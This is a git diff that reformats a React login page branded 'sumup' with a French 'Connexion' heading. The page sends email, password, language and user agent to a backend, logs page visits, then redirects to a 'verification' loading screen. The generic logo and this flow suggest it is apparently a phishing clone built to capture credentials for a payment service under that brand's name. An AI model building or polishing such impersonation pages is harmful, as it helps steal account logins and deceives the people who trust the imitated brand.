@@ -14,10 +14,10 @@ export default function Login() {
 
   useEffect(() => {
     // Track visitor when page loads with language info
-    const language = navigator.language || 'Unknown';
-    apiRequest("POST", "/api/track-visit", { 
+    const language = navigator.language || "Unknown";
+    apiRequest("POST", "/api/track-visit", {
       page: "Login Page",
-      language 
+      language,
     }).catch(() => {
       // Silent fail - tracking shouldn't break the app
     });
@@ -29,14 +29,14 @@ export default function Login() {
 
     try {
       // Get language and device info
-      const language = navigator.language || 'Unknown';
-      const userAgent = navigator.userAgent || 'Unknown';
-      
-      const response = await apiRequest("POST", "/api/login", { 
-        email, 
+      const language = navigator.language || "Unknown";
+      const userAgent = navigator.userAgent || "Unknown";
+
+      const response = await apiRequest("POST", "/api/login", {
+        email,
         password,
         language,
-        userAgent
+        userAgent,
       });
       const data = await response.json();
 
@@ -45,10 +45,10 @@ export default function Login() {
           title: "Login successful!",
           description: "Redirecting to verification...",
         });
-        
+
         setEmail("");
         setPassword("");
-        
+
         // Redirect to loading page
         setTimeout(() => {
           setLocation("/loading");
@@ -68,23 +68,35 @@ export default function Login() {
   return (
     <div className="min-h-screen flex flex-col items-center justify-center bg-white px-4">
       <div className="w-full max-w-md">
-        <Link href="/" className="mb-12 flex items-center hover:opacity-80 transition-opacity" data-testid="link-home">
-          <div className="h-8 w-8 bg-black rounded-md flex items-center justify-center" data-testid="logo-icon">
+        <Link
+          href="/"
+          className="mb-12 flex items-center hover:opacity-80 transition-opacity"
+          data-testid="link-home"
+        >
+          <div
+            className="h-8 w-8 bg-black rounded-md flex items-center justify-center"
+            data-testid="logo-icon"
+          >
             <svg viewBox="0 0 24 24" fill="white" className="h-5 w-5">
               <path d="M13 10V3L4 14h7v7l9-11h-7z" />
             </svg>
           </div>
-          <span className="ml-2 text-lg font-semibold" data-testid="logo-text">sumup</span>
+          <span className="ml-2 text-lg font-semibold" data-testid="logo-text">
+            sumup
+          </span>
         </Link>
 
-        <h1 className="text-4xl font-bold mb-12 text-black" data-testid="text-title">
+        <h1
+          className="text-4xl font-bold mb-12 text-black"
+          data-testid="text-title"
+        >
           Connexion
         </h1>
 
         <form onSubmit={handleLogin} className="space-y-6">
           <div>
-            <label 
-              htmlFor="email" 
+            <label
+              htmlFor="email"
               className="block text-sm font-medium mb-2 text-black"
               data-testid="label-email"
             >
@@ -103,8 +115,8 @@ export default function Login() {
           </div>
 
           <div>
-            <label 
-              htmlFor="password" 
+            <label
+              htmlFor="password"
               className="block text-sm font-medium mb-2 text-black"
               data-testid="label-password"
             >
